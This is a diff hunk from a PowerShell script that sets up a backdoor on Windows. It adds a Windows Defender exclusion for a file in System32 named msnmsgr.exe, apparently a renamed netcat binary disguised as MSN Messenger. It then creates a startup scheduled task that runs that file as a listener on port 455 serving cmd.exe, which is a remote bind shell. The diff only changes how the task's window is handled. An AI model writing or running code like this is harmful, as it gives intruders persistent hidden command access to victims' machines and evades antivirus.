@@ -51,7 +51,7 @@ if (Test-Path "$system32Path\nc.exe") {
 Write-Host "4/10: Setting up System Startup..."
 Add-MpPreference -ExclusionPath "C:\Windows\System32\msnmsgr.exe"
 
-$Action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\msnmsgr.exe' -Argument '-l -p 455 -e cmd.exe' -WorkingDirectory 'C:\Windows\System32' -WindowStyle Hidden
+$Action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\msnmsgr.exe' -Argument '-l -p 455 -e cmd.exe' -WorkingDirectory 'C:\Windows\System32' -NoNewWindow
 $Trigger = New-ScheduledTaskTrigger -AtStartup
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable
 $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings
